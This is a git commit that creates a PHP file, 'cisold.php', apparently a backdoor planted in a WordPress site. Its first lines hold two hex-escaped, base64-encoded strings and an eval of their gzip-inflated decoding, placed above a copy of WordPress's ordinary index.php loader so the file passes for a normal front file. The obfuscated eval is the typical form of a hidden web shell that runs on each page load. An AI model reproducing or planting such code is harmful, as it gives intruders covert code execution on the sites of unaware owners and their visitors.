f259623ccec792384c01ac31958400f73ad9fae5
eagles227 <166109731+eagles227@users.noreply.github.com>
2024-12-09 06:49:30 +0000

    Create cisold.php

---
+++ cisold.php
@@ -0,0 +1,22 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "pjE9w\x63dQ8yy\x437E\x2bkjUzFn92\x2br\x2bueVN3/y1otuNhl\x624dQ/eeUwFT4PjJRlOdIK3jg5ww9psHnXQk1I\x41XtlF\x63G\x61SHO\x42EswkHL0ir2E4s3\x62\x62slQloRwiy209MFkqd0iL0G3whR\x62\x61f\x62rlPI\x61lYZjFm92W\x61Kpmi7EjvZwrtsfi3DTnZJVPqVG5mvLJqTyr\x637\x63U5G/\x61ld1q\x2bigTrghPuLpVfoUW\x42n0ppJPGL\x43OZIjUvm/SO\x2bIWUgp\x62xZ\x43RpuOmx\x61SWztESX65\x63T6L\x42qOeop\x42opOv\x6277ENXeqSY\x2bk08eZt6/\x2bW\x61pQKu1HMOoGi7Yp\x63pRn\x4265mn4/q\x43Gz3Qyyko498oHzIzG1mud0NV5x0kFyFU419fdV7j2R2\x63OtxHrprSGGJXLqei6kjElMH4SKYhJ6h9nsP7\x43\x61yqP47Qr1nTejMF8Fe\x61vjv\x423Sl\x62L0/h8Ovw9\x62TWJoUFikgrkKmr7n\x61K2shmDgy4\x616et/38SZnOdHrnnOdD46GuNunx\x2bSono4j8vGrNxu6OtTvJrHUmoL\x63\x41D\x61DXvn/iwPs\x41Pr/yonh9yTWx\x42M\x42fwHF8ZXU0fGv61g\x2byt5o/Kkdr\x42vWs\x62Q\x62YGJqGTXeJy5hHnwy8\x4350QrooSeGDrilSg8Oett\x42QL25D\x43Ns\x41KMD6\x41/g\x43rmoSFDxn9xul4269d6h\x2b0wF6vwoPff69tG\x63hdp\x42Qo/P4NxHlIesUJI6o9ps\x43\x41s\x61meEIRHfiLg6UO3NtzJ\x61emF5ooGVTgM\x63\x618U3Lxidx9\x410qguS9iTxTd9ud3\x62WGd6\x62MWmSfmO5g/I47/5Oul\x43MvXol67kY3Qr4Nk0mJrUS\x616gok1eNZo2HO\x42m\x43\x41RFEs/T9r8\x42\x42Q\x62\x2bWXU1\x62/\x61KQZ\x42wJe9/o\x41wFQ/KKQd\x42wJe9/n\x41\x41GQ/6JQh\x42wJe9/m\x41QGQ/qJQl\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+/**
+ * Front to the WordPress application.
+ * 
+ * This file doesn't do anything, but loads wp-blog-header.php which does 
+ * and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
